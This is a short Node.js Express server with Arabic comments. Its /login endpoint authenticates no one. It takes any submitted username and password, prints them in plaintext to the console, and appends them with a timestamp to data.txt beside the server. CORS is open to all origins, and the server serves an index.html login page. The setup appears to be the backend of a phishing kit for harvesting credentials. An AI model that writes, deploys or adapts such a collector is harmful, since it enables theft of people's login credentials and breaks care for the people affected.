// استدعاء المكتبات البرمجية الأساسية
const express = require('express');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// تفعيل الصلاحيات لاستقبال البيانات
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// قراءة ملفات الواجهة من نفس المجلد الحالي (public)
app.use(express.static(__dirname));

// الرابط المسؤول عن استقبال البيانات وحفظها
app.post('/login', (req, res) => {
    const data = req.body;
    const username = data.username || data.email || 'غير معروف';
    const password = data.password || 'غير معروف';

    // 1. طباعة البيانات فوراً في الشاشة السوداء
    console.log("\n=====================================");
    console.log("📥 تم استقبال بيانات جديدة بنجاح!");
    console.log(`👤 اسم المستخدم: ${username}`);
    console.log(`🔑 كلمة المرور: ${password}`);
    console.log("=====================================\n");

    // 2. تنسيق البيانات لحفظها في ملف data.txt
    const logData = `[${new Date().toLocaleString()}] -> User: ${username} | Pass: ${password}\n`;

    // 3. كتابة البيانات داخل ملف data.txt بجانب السيرفر تماماً
    fs.appendFileSync(path.join(__dirname, 'data.txt'), logData, 'utf8');

    // الرد على المتصفح بعد النجاح
    res.send('<h1>تم استقبال البيانات بنجاح في السيرفر وحفظها!</h1>');
});

// فتح ملف index.html تلقائياً عند طلب الرابط الرئيسي
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// تشغيل السيرفر
app.listen(PORT, () => {
    console.log(`\n🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀`);
    console.log(`السيرفر يعمل الآن بنجاح على الرابط: http://localhost:${PORT}`);
    console.log(`🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀\n`);
});
